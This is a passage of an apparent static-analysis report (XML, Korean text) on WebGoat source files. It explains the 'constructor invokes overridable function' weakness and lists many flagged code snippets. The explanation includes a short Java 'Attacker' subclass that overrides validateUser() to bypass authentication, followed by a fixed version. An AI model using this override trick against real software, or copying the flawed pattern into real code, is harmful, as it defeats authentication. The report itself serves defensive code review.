validateUser 함수와 클래스는 final이 아니므로 오버라이드할 수 있습니다. 그런 다음 이 함수를 오버라이드하는 하위 클래스로 변수를 초기화하면 validateUser 기능을 무시할 수 있습니다. 예: 


  ...
  class Attacker extends User{
    public Attacker(String username, String password){
      super(username, password);
    }
    public boolean validateUser(String username, String password){
      return true;
    }
  }
  ...
  class MainClass{
    public static void main(String[] args){
      User hacker = new Attacker("Evil", "Hacker");
      if (hacker.isValid()){
        System.out.println("Attack successful!");
      }else{
        System.out.println("Attack failed");
      }
    }
  }


Example 1의 코드는 “Attack successful!”을 출력합니다. Attacker 클래스는 슈퍼클래스 User의 생성자에서 호출되는 validateUser() 함수를 오버라이드하고, Java는 생성자에서 호출되는 함수의 하위 클래스를 먼저 확인하기 때문입니다.</Value>
                            </MetaInfo>
                            <MetaInfo>
<Name>Recommendations</Name>
<Value>생성자는 오버라이드할 수 있는 함수를 final로 지정하거나 클래스를 final로 지정하여 해당 함수를 호출해서는 안 됩니다. 이 코드가 생성자에서만 필요한 경우에는 private 접근 지정자를 사용하거나, 슈퍼클래스의 생성자에 로직을 직접 배치할 수도 있습니다.

예제 2: 다음 코드는 다른 위치에서 함수를 오버라이드할 수 없도록 클래스를 final로 지정합니다.


  ...
  final class User {
    private String username;
    private boolean valid;
    public User(String username, String password){
      this.username = username;
      this.valid = validateUser(username, password);
    }
    private boolean validateUser(String username, String password){
      //validate user is real and can authenticate
      ...
    }
    public final boolean isValid(){
      return valid;
    }
  }


이 예제에서는 클래스를 하위 클래스로 구분할 수 없도록 final로 지정하고, validateUser() 함수는 이 응용 프로그램의 다른 위치에서 필요하지 않으므로 private로 변경합니다. 이 방식은 방어적인 프로그래밍 기술인데, 나중에 User 클래스를 하위 클래스로 구분해야 할 수 있기 때문입니다. 이 경우 validateUser() 함수를 private으로 설정하지 않았다면 이 취약점이 다시 나타나게 됩니다.</Value>
                            </MetaInfo>
                            <AttributeValue>
<Name>&lt;Unaudited&gt;</Name>
<Count>50</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>Not an Issue</Name>
<Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>Reliability Issue</Name>
<Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>Bad Practice</Name>
<Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>Suspicious</Name>
<Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>Exploitable</Name>
<Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>Not predicted</Name>
<Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>indeterminate(not an issue threshold)</Name>
<Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>indeterminate(below exploitable threshold)</Name>
<Count>0</Count>
                            </AttributeValue>
                        </MajorAttributeSummary>
                        <Issue iid="B8B6C94D90ECF3F100474A005A43A0ED" ruleID="95ACE7A2-BF14-4254-AFD3-22769C5FDC5F">
                            <Category>Code Correctness: Constructor Invokes Overridable Function</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Code Quality</Kingdom>
                            <Abstract>ErrorScreen.java의 78 줄에서 ErrorScreen의 생성자는 공격자가 재정의할 수 있는 함수를 호출합니다.</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
<FileName>ErrorScreen.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/session/ErrorScreen.java</FilePath>
<LineStart>78</LineStart>
<Snippet>	{
		this.error = t;
		fixCurrentScreen( s );
		setup( s );
	}</Snippet>
<TargetFunction>FunctionCall: fixCurrentScreen()</TargetFunction>
                            </Primary>
                        </Issue>
                        <Issue iid="C99BF6F7C13B6FEC09F7DFC731777E3C" ruleID="95ACE7A2-BF14-4254-AFD3-22769C5FDC5F">
                            <Category>Code Correctness: Constructor Invokes Overridable Function</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Code Quality</Kingdom>
                            <Abstract>SQLInjection.java의 169 줄에서 SQLInjection의 생성자는 공격자가 재정의할 수 있는 함수를 호출합니다.</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
<FileName>SQLInjection.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/SQLInjection/SQLInjection.java</FilePath>
<LineStart>169</LineStart>
<Snippet>	registerAction(new Login(this, myClassName, LOGIN_ACTION,
		getAction(LISTSTAFF_ACTION)));
	registerAction(new Logout(this, myClassName, LOGOUT_ACTION,
		getAction(LOGIN_ACTION)));
	registerAction(new FindProfile(this, myClassName, FINDPROFILE_ACTION,</Snippet>
<TargetFunction>FunctionCall: registerAction()</TargetFunction>
                            </Primary>
                        </Issue>
                        <Issue iid="07F2625B9C5895A77FB7CBB5BCDA7772" ruleID="95ACE7A2-BF14-4254-AFD3-22769C5FDC5F">
                            <Category>Code Correctness: Constructor Invokes Overridable Function</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Code Quality</Kingdom>
                            <Abstract>SQLInjection.java의 172 줄에서 SQLInjection의 생성자는 공격자가 재정의할 수 있는 함수를 호출합니다.</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
<FileName>SQLInjection.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/SQLInjection/SQLInjection.java</FilePath>
<LineStart>172</LineStart>
<Snippet>		getAction(LOGIN_ACTION)));
	registerAction(new FindProfile(this, myClassName, FINDPROFILE_ACTION,
		getAction(VIEWPROFILE_ACTION)));
	registerAction(new UpdateProfile(this, myClassName,
		UPDATEPROFILE_ACTION, getAction(VIEWPROFILE_ACTION)));</Snippet>
<TargetFunction>FunctionCall: getAction()</TargetFunction>
                            </Primary>
                        </Issue>
                        <Issue iid="C99BF6F7C13B6FEC09F7DFC731777E3E" ruleID="95ACE7A2-BF14-4254-AFD3-22769C5FDC5F">
                            <Category>Code Correctness: Constructor Invokes Overridable Function</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Code Quality</Kingdom>
                            <Abstract>SQLInjection.java의 173 줄에서 SQLInjection의 생성자는 공격자가 재정의할 수 있는 함수를 호출합니다.</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
<FileName>SQLInjection.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/SQLInjection/SQLInjection.java</FilePath>
<LineStart>173</LineStart>
<Snippet>	registerAction(new FindProfile(this, myClassName, FINDPROFILE_ACTION,
		getAction(VIEWPROFILE_ACTION)));
	registerAction(new UpdateProfile(this, myClassName,
		UPDATEPROFILE_ACTION, getAction(VIEWPROFILE_ACTION)));
	registerAction(new DeleteProfile(this, myClassName,</Snippet>
<TargetFunction>FunctionCall: registerAction()</TargetFunction>
                            </Primary>
                        </Issue>
                        <Issue iid="C99BF6F7C13B6FEC09F7DFC731777E3B" ruleID="95ACE7A2-BF14-4254-AFD3-22769C5FDC5F">
                            <Category>Code Correctness: Constructor Invokes Overridable Function</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Code Quality</Kingdom>
                            <Abstract>SQLInjection.java의 167 줄에서 SQLInjection의 생성자는 공격자가 재정의할 수 있는 함수를 호출합니다.</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
<FileName>SQLInjection.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/SQLInjection/SQLInjection.java</FilePath>
<LineStart>167</LineStart>
<Snippet>
	// These actions are special in that they chain to other actions.
	registerAction(new Login(this, myClassName, LOGIN_ACTION,
		getAction(LISTSTAFF_ACTION)));
	registerAction(new Logout(this, myClassName, LOGOUT_ACTION,</Snippet>
<TargetFunction>FunctionCall: registerAction()</TargetFunction>
                            </Primary>
                        </Issue>
                        <Issue iid="D01E8C3B3A9A446059B04DB981440B23" ruleID="95ACE7A2-BF14-4254-AFD3-22769C5FDC5F">
                            <Category>Code Correctness: Constructor Invokes Overridable Function</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Code Quality</Kingdom>
                            <Abstract>CrossSiteScripting.java의 158 줄에서 CrossSiteScripting의 생성자는 공격자가 재정의할 수 있는 함수를 호출합니다.</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
<FileName>CrossSiteScripting.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/CrossSiteScripting/CrossSiteScripting.java</FilePath>
<LineStart>158</LineStart>
<Snippet>	String myClassName = parseClassName(this.getClass().getName());
	registerAction(new ListStaff(this, myClassName, LISTSTAFF_ACTION));
	registerAction(new SearchStaff(this, myClassName, SEARCHSTAFF_ACTION));
	registerAction(new ViewProfile(this, myClassName, VIEWPROFILE_ACTION));
	registerAction(new EditProfile(this, myClassName, EDITPROFILE_ACTION));</Snippet>
<TargetFunction>FunctionCall: registerAction()</TargetFunction>
                            </Primary>
                        </Issue>
                        <Issue iid="D01E8C3B3A9A446059B04DB981440B27" ruleID="95ACE7A2-BF14-4254-AFD3-22769C5FDC5F">
                            <Category>Code Correctness: Constructor Invokes Overridable Function</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Code Quality</Kingdom>
                            <Abstract>CrossSiteScripting.java의 164 줄에서 CrossSiteScripting의 생성자는 공격자가 재정의할 수 있는 함수를 호출합니다.</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
<FileName>CrossSiteScripting.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/CrossSiteScripting/CrossSiteScripting.java</FilePath>
<LineStart>164</LineStart>
<Snippet>
	// These actions are special in that they chain to other actions.
	registerAction(new Login(this, myClassName, LOGIN_ACTION,
		getAction(LISTSTAFF_ACTION)));
	registerAction(new Logout(this, myClassName, LOGOUT_ACTION,</Snippet>
<TargetFunction>FunctionCall: registerAction()</TargetFunction>
                            </Primary>
                        </Issue>
                        <Issue iid="D01E8C3B3A9A446059B04DB981440B26" ruleID="95ACE7A2-BF14-4254-AFD3-22769C5FDC5F">
                            <Category>Code Correctness: Constructor Invokes Overridable Function</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Code Quality</Kingdom>
                            <Abstract>CrossSiteScripting.java의 161 줄에서 CrossSiteScripting의 생성자는 공격자가 재정의할 수 있는 함수를 호출합니다.</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
<FileName>CrossSiteScripting.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/CrossSiteScripting/CrossSiteScripting.java</FilePath>
<LineStart>161</LineStart>
<Snippet>	registerAction(new ViewProfile(this, myClassName, VIEWPROFILE_ACTION));
	registerAction(new EditProfile(this, myClassName, EDITPROFILE_ACTION));
	registerAction(new EditProfile(this, myClassName, CREATEPROFILE_ACTION));

	// These actions are special in that they chain to other actions.</Snippet>
<TargetFunction>FunctionCall: registerAction()</TargetFunction>
                            </Primary>
                        </Issue>
                        <Issue iid="C99BF6F7C13B6FEC09F7DFC731777E38" ruleID="95ACE7A2-BF14-4254-AFD3-22769C5FDC5F">
                            <Category>Code Correctness: Constructor Invokes Overridable Function</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Code Quality</Kingdom>
                            <Abstract>SQLInjection.java의 162 줄에서 SQLInjection의 생성자는 공격자가 재정의할 수 있는 함수를 호출합니다.</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
<FileName>SQLInjection.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/SQLInjection/SQLInjection.java</FilePath>
<LineStart>162</LineStart>
<Snippet>	registerAction(new ListStaff(this, myClassName, LISTSTAFF_ACTION));
	registerAction(new SearchStaff(this, myClassName, SEARCHSTAFF_ACTION));
	registerAction(new ViewProfile(this, myClassName, VIEWPROFILE_ACTION));
	registerAction(new EditProfile(this, myClassName, EDITPROFILE_ACTION));
	registerAction(new EditProfile(this, myClassName, CREATEPROFILE_ACTION));</Snippet>
<TargetFunction>FunctionCall: registerAction()</TargetFunction>
                            </Primary>
                        </Issue>
                        <Issue iid="82621CFD29147E47E261EC7B13859328" ruleID="95ACE7A2-BF14-4254-AFD3-22769C5FDC5F">
                            <Category>Code Correctness: Constructor Invokes Overridable Function</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Code Quality</Kingdom>
                            <Abstract>RoleBasedAccessControl.java의 159 줄에서 RoleBasedAccessControl의 생성자는 공격자가 재정의할 수 있는 함수를 호출합니다.</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
<FileName>RoleBasedAccessControl.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/RoleBasedAccessControl/RoleBasedAccessControl.java</FilePath>
<LineStart>159</LineStart>
<Snippet>	registerAction(new Login(this, myClassName, LOGIN_ACTION,
		getAction(LISTSTAFF_ACTION)));
	registerAction(new Logout(this, myClassName, LOGOUT_ACTION,
		getAction(LOGIN_ACTION)));
	registerAction(new FindProfile(this, myClassName, FINDPROFILE_ACTION,</Snippet>
<TargetFunction>FunctionCall: registerAction()</TargetFunction>
                            </Primary>
                        </Issue>
                        <Issue iid="07F2625B9C5895A77FB7CBB5BCDA7773" ruleID="95ACE7A2-BF14-4254-AFD3-22769C5FDC5F">
                            <Category>Code Correctness: Constructor Invokes Overridable Function</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Code Quality</Kingdom>
                            <Abstract>SQLInjection.java의 174 줄에서 SQLInjection의 생성자는 공격자가 재정의할 수 있는 함수를 호출합니다.</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
<FileName>SQLInjection.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/SQLInjection/SQLInjection.java</FilePath>
<LineStart>174</LineStart>
<Snippet>		getAction(VIEWPROFILE_ACTION)));
	registerAction(new UpdateProfile(this, myClassName,
		UPDATEPROFILE_ACTION, getAction(VIEWPROFILE_ACTION)));
	registerAction(new DeleteProfile(this, myClassName,
		DELETEPROFILE_ACTION, getAction(LISTSTAFF_ACTION)));</Snippet>
<TargetFunction>FunctionCall: getAction()</TargetFunction>
                            </Primary>
                        </Issue>
                        <Issue iid="3B3F9A4D12136F630117D7F1BF2CF95C" ruleID="95ACE7A2-BF14-4254-AFD3-22769C5FDC5F">
                            <Category>Code Correctness: Constructor Invokes Overridable Function</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Code Quality</Kingdom>
                            <Abstract>ErrorScreen.java의 93 줄에서 ErrorScreen의 생성자는 공격자가 재정의할 수 있는 함수를 호출합니다.</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
<FileName>ErrorScreen.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/session/ErrorScreen.java</FilePath>
<LineStart>93</LineStart>
<Snippet>		this.message = msg;
		fixCurrentScreen( s );
		setup( s );
	}
</Snippet>
<TargetFunction>FunctionCall: setup()</TargetFunction>
                            </Primary>
                        </Issue>
                        <Issue iid="F8FD4793598B75E0D14B7EB3DE0C8D38" ruleID="95ACE7A2-BF14-4254-AFD3-22769C5FDC5F">
                            <Category>Code Correctness: Constructor Invokes Overridable Function</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Code Quality</Kingdom>
                            <Abstract>ErrorScreen.java의 92 줄에서 ErrorScreen의 생성자는 공격자가 재정의할 수 있는 함수를 호출합니다.</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
<FileName>ErrorScreen.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/session/ErrorScreen.java</FilePath>
<LineStart>92</LineStart>
<Snippet>	{
		this.message = msg;
		fixCurrentScreen( s );
		setup( s );
	}</Snippet>
<TargetFunction>FunctionCall: fixCurrentScreen()</TargetFunction>
                            </Primary>
                        </Issue>
                        <Issue iid="1FDE9E3D6EDDBB6E6F626A695AFDE1A1" ruleID="95ACE7A2-BF14-4254-AFD3-22769C5FDC5F">
                            <Category>Code Correctness: Constructor Invokes Overridable Function</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Code Quality</Kingdom>
                            <Abstract>CrossSiteScripting.java의 165 줄에서 CrossSiteScripting의 생성자는 공격자가 재정의할 수 있는 함수를 호출합니다.</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
<FileName>CrossSiteScripting.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/CrossSiteScripting/CrossSiteScripting.java</FilePath>
<LineStart>165</LineStart>
<Snippet>	// These actions are special in that they chain to other actions.
	registerAction(new Login(this, myClassName, LOGIN_ACTION,
		getAction(LISTSTAFF_ACTION)));
	registerAction(new Logout(this, myClassName, LOGOUT_ACTION,
		getAction(LOGIN_ACTION)));</Snippet>
<TargetFunction>FunctionCall: getAction()</TargetFunction>
                            </Primary>
                        </Issue>
                        <Issue iid="C99BF6F7C13B6FEC09F7DFC731777E3F" ruleID="95ACE7A2-BF14-4254-AFD3-22769C5FDC5F">
                            <Category>Code Correctness: Constructor Invokes Overridable Function</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Code Quality</Kingdom>
                            <Abstract>SQLInjection.java의 175 줄에서 SQLInjection의 생성자는 공격자가 재정의할 수 있는 함수를 호출합니다.</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
<FileName>SQLInjection.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/SQLInjection/SQLInjection.java</FilePath>
<LineStart>175</LineStart>
<Snippet>	registerAction(new UpdateProfile(this, myClassName,
		UPDATEPROFILE_ACTION, getAction(VIEWPROFILE_ACTION)));
	registerAction(new DeleteProfile(this, myClassName,
		DELETEPROFILE_ACTION, getAction(LISTSTAFF_ACTION)));
    }</Snippet>
<TargetFunction>FunctionCall: registerAction()</TargetFunction>
                            </Primary>
                        </Issue>
                        <Issue iid="BA1BCCA52750408653E16ED8DD1555C1" ruleID="95ACE7A2-BF14-4254-AFD3-22769C5FDC5F">
                            <Category>Code Correctness: Constructor Invokes Overridable Function</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Code Quality</Kingdom>
                            <Abstract>ErrorScreen.java의 79 줄에서 ErrorScreen의 생성자는 공격자가 재정의할 수 있는 함수를 호출합니다.</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
<FileName>ErrorScreen.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/session/ErrorScreen.java</FilePath>
<LineStart>79</LineStart>
<Snippet>		this.error = t;
		fixCurrentScreen( s );
		setup( s );
	}
</Snippet>
<TargetFunction>FunctionCall: setup()</TargetFunction>
                            </Primary>
                        </Issue>
                        <Issue iid="C99BF6F7C13B6FEC09F7DFC731777E3D" ruleID="95ACE7A2-BF14-4254-AFD3-22769C5FDC5F">
                            <Category>Code Correctness: Constructor Invokes Overridable Function</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Code Quality</Kingdom>
                            <Abstract>SQLInjection.java의 171 줄에서 SQLInjection의 생성자는 공격자가 재정의할 수 있는 함수를 호출합니다.</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
<FileName>SQLInjection.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/SQLInjection/SQLInjection.java</FilePath>
<LineStart>171</LineStart>
<Snippet>	registerAction(new Logout(this, myClassName, LOGOUT_ACTION,
		getAction(LOGIN_ACTION)));
	registerAction(new FindProfile(this, myClassName, FINDPROFILE_ACTION,
		getAction(VIEWPROFILE_ACTION)));
	registerAction(new UpdateProfile(this, myClassName,</Snippet>
<TargetFunction>FunctionCall: registerAction()</TargetFunction>
                            </Primary>
                        </Issue>
                        <Issue iid="82621CFD29147E47E261EC7B13859327" ruleID="95ACE7A2-BF14-4254-AFD3-22769C5FDC5F">
                            <Category>Code Correctness: Constructor Invokes Overridable Function</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Code Quality</Kingdom>
                            <Abstract>RoleBasedAccessControl.java의 157 줄에서 RoleBasedAccessControl의 생성자는 공격자가 재정의할 수 있는 함수를 호출합니다.</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
<FileName>RoleBasedAccessControl.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/RoleBasedAccessControl/RoleBasedAccessControl.java</FilePath>
<LineStart>157</LineStart>
<Snippet>
	// These actions are special in that they chain to other actions.
	registerAction(new Login(this, myClassName, LOGIN_ACTION,
		getAction(LISTSTAFF_ACTION)));
	registerAction(new Logout(this, myClassName, LOGOUT_ACTION,</Snippet>
<TargetFunction>FunctionCall: registerAction()</TargetFunction>
                            </Primary>
                        </Issue>
                        <Issue iid="D01E8C3B3A9A446059B04DB981440B2B" ruleID="95ACE7A2-BF14-4254-AFD3-22769C5FDC5F">
                            <Category>Code Correctness: Constructor Invokes Overridable Function</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Code Quality</Kingdom>
                            <Abstract>CrossSiteScripting.java의 172 줄에서 CrossSiteScripting의 생성자는 공격자가 재정의할 수 있는 함수를 호출합니다.</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
<FileName>CrossSiteScripting.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/CrossSiteScripting/CrossSiteScripting.java</FilePath>
<LineStart>172</LineStart>
<Snippet>	registerAction(new UpdateProfile(this, myClassName,
		UPDATEPROFILE_ACTION, getAction(VIEWPROFILE_ACTION)));
	registerAction(new DeleteProfile(this, myClassName,
		DELETEPROFILE_ACTION, getAction(LISTSTAFF_ACTION)));
    }</Snippet>
<TargetFunction>FunctionCall: registerAction()</TargetFunction>
                            </Primary>
                        </Issue>
                        <Issue iid="82621CFD29147E47E261EC7B1385932A" ruleID="95ACE7A2-BF14-4254-AFD3-22769C5FDC5F">
                            <Category>Code Correctness: Constructor Invokes Overridable Function</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Code Quality</Kingdom>
                            <Abstract>RoleBasedAccessControl.java의 163 줄에서 RoleBasedAccessControl의 생성자는 공격자가 재정의할 수 있는 함수를 호출합니다.</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
<FileName>RoleBasedAccessControl.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/RoleBasedAccessControl/RoleBasedAccessControl.java</FilePath>
<LineStart>163</LineStart>
<Snippet>	registerAction(new FindProfile(this, myClassName, FINDPROFILE_ACTION,
		getAction(VIEWPROFILE_ACTION)));
	registerAction(new UpdateProfile(this, myClassName,
		UPDATEPROFILE_ACTION, getAction(VIEWPROFILE_ACTION)));
	registerAction(new DeleteProfile(this, myClassName,</Snippet>
<TargetFunction>FunctionCall: registerAction()</TargetFunction>
                            </Primary>
                        </Issue>
                        <Issue iid="C99BF6F7C13B6FEC09F7DFC731777E36" ruleID="95ACE7A2-BF14-4254-AFD3-22769C5FDC5F">
                            <Category>Code Correctness: Constructor Invokes Overridable Function</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Code Quality</Kingdom>
                            <Abstract>SQLInjection.java의 160 줄에서 SQLInjection의 생성자는 공격자가 재정의할 수 있는 함수를 호출합니다.</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
<FileName>SQLInjection.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/SQLInjection/SQLInjection.java</FilePath>
<LineStart>160</LineStart>
<Snippet>    {
	String myClassName = parseClassName(this.getClass().getName());
	registerAction(new ListStaff(this, myClassName, LISTSTAFF_ACTION));
	registerAction(new SearchStaff(this, myClassName, SEARCHSTAFF_ACTION));
	registerAction(new ViewProfile(this, myClassName, VIEWPROFILE_ACTION));</Snippet>
<TargetFunction>FunctionCall: registerAction()</TargetFunction>
                            </Primary>
                        </Issue>
                        <Issue iid="C99BF6F7C13B6FEC09F7DFC731777E37" ruleID="95ACE7A2-BF14-4254-AFD3-22769C5FDC5F">
                            <Category>Code Correctness: Constructor Invokes Overridable Function</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Code Quality</Kingdom>
                            <Abstract>SQLInjection.java의 161 줄에서 SQLInjection의 생성자는 공격자가 재정의할 수 있는 함수를 호출합니다.</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
<FileName>SQLInjection.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/SQLInjection/SQLInjection.java</FilePath>
<LineStart>161</LineStart>
<Snippet>	String myClassName = parseClassName(this.getClass().getName());
	registerAction(new ListStaff(this, myClassName, LISTSTAFF_ACTION));
	registerAction(new SearchStaff(this, myClassName, SEARCHSTAFF_ACTION));
	registerAction(new ViewProfile(this, myClassName, VIEWPROFILE_ACTION));
	registerAction(new EditProfile(this, myClassName, EDITPROFILE_ACTION));</Snippet>
<TargetFunction>FunctionCall: registerAction()</TargetFunction>
                            </Primary>
                        </Issue>
                        <Issue iid="A56A07CF6FDD4FAD1BDF963C5B413580" ruleID="95ACE7A2-BF14-4254-AFD3-22769C5FDC5F">
                            <Category>Code Correctness: Constructor Invokes Overridable Function</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Code Quality</Kingdom>
                            <Abstract>RoleBasedAccessControl.java의 164 줄에서 RoleBasedAccessControl의 생성자는 공격자가 재정의할 수 있는 함수를 호출합니다.</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
<FileName>RoleBasedAccessControl.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/RoleBasedAccessControl/RoleBasedAccessControl.java</FilePath>
<LineStart>164</LineStart>
<Snippet>		getAction(VIEWPROFILE_ACTION)));
	registerAction(new UpdateProfile(this, myClassName,
		UPDATEPROFILE_ACTION, getAction(VIEWPROFILE_ACTION)));
	registerAction(new DeleteProfile(this, myClassName,
		DELETEPROFILE_ACTION, getAction(LISTSTAFF_ACTION)));</Snippet>
<TargetFunction>FunctionCall: getAction()</TargetFunction>
                            </Primary>
                        </Issue>
                        <Issue iid="8725A59F95BE9B010DF3FD808D928D84" ruleID="95ACE7A2-BF14-4254-AFD3-22769C5FDC5F">
                            <Category>Code Correctness: Constructor Invokes Overridable Function</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Code Quality</Kingdom>
                            <Abstract>SQLInjection.java의 176 줄에서 SQLInjection의 생성자는 공격자가 재정의할 수 있는 함수를 호출합니다.</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
<FileName>SQLInjection.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/SQLInjection/SQLInjection.java</FilePath>
<LineStart>176</LineStart>
<Snippet>		UPDATEPROFILE_ACTION, getAction(VIEWPROFILE_ACTION)));
	registerAction(new DeleteProfile(this, myClassName,
		DELETEPROFILE_ACTION, getAction(LISTSTAFF_ACTION)));
    }
</Snippet>
<TargetFunction>FunctionCall: getAction()</TargetFunction>
                            </Primary>
                        </Issue>
                        <Issue iid="A56A07CF6FDD4FAD1BDF963C5B41357F" ruleID="95ACE7A2-BF14-4254-AFD3-22769C5FDC5F">
                            <Category>Code Correctness: Constructor Invokes Overridable Function</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Code Quality</Kingdom>
                            <Abstract>RoleBasedAccessControl.java의 162 줄에서 RoleBasedAccessControl의 생성자는 공격자가 재정의할 수 있는 함수를 호출합니다.</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
<FileName>RoleBasedAccessControl.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/RoleBasedAccessControl/RoleBasedAccessControl.java</FilePath>
<LineStart>162</LineStart>
<Snippet>		getAction(LOGIN_ACTION)));
	registerAction(new FindProfile(this, myClassName, FINDPROFILE_ACTION,
		getAction(VIEWPROFILE_ACTION)));
	registerAction(new UpdateProfile(this, myClassName,
		UPDATEPROFILE_ACTION, getAction(VIEWPROFILE_ACTION)));</Snippet>
<TargetFunction>FunctionCall: getAction()</TargetFunction>
                            </Primary>
                        </Issue>
                        <Issue iid="D01E8C3B3A9A446059B04DB981440B25" ruleID="95ACE7A2-BF14-4254-AFD3-22769C5FDC5F">
                            <Category>Code Correctness: Constructor Invokes Overridable Function</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Code Quality</Kingdom>
                            <Abstract>CrossSiteScripting.java의 160 줄에서 CrossSiteScripting의 생성자는 공격자가 재정의할 수 있는 함수를 호출합니다.</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
<FileName>CrossSiteScripting.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/CrossSiteScripting/CrossSiteScripting.java</FilePath>
<LineStart>160</LineStart>
<Snippet>	registerAction(new SearchStaff(this, myClassName, SEARCHSTAFF_ACTION));
	registerAction(new ViewProfile(this, myClassName, VIEWPROFILE_ACTION));
	registerAction(new EditProfile(this, myClassName, EDITPROFILE_ACTION));
	registerAction(new EditProfile(this, myClassName, CREATEPROFILE_ACTION));
</Snippet>
<TargetFunction>FunctionCall: registerAction()</TargetFunction>
                            </Primary>
                        </Issue>
                        <Issue iid="82621CFD29147E47E261EC7B13859325" ruleID="95ACE7A2-BF14-4254-AFD3-22769C5FDC5F">
                            <Category>Code Correctness: Constructor Invokes Overridable Function</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Code Quality</Kingdom>
                            <Abstract>RoleBasedAccessControl.java의 153 줄에서 RoleBasedAccessControl의 생성자는 공격자가 재정의할 수 있는 함수를 호출합니다.</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
<FileName>RoleBasedAccessControl.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/RoleBasedAccessControl/RoleBasedAccessControl.java</FilePath>
<LineStart>153</LineStart>
<Snippet>	registerAction(new SearchStaff(this, myClassName, SEARCHSTAFF_ACTION));
	registerAction(new ViewProfile(this, myClassName, VIEWPROFILE_ACTION));
	registerAction(new EditProfile(this, myClassName, EDITPROFILE_ACTION));
	registerAction(new EditProfile(this, myClassName, CREATEPROFILE_ACTION));
</Snippet>
<TargetFunction>FunctionCall: registerAction()</TargetFunction>
                            </Primary>
                        </Issue>
                        <Issue iid="82621CFD29147E47E261EC7B1385932B" ruleID="95ACE7A2-BF14-4254-AFD3-22769C5FDC5F">
                            <Category>Code Correctness: Constructor Invokes Overridable Function</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Code Quality</Kingdom>
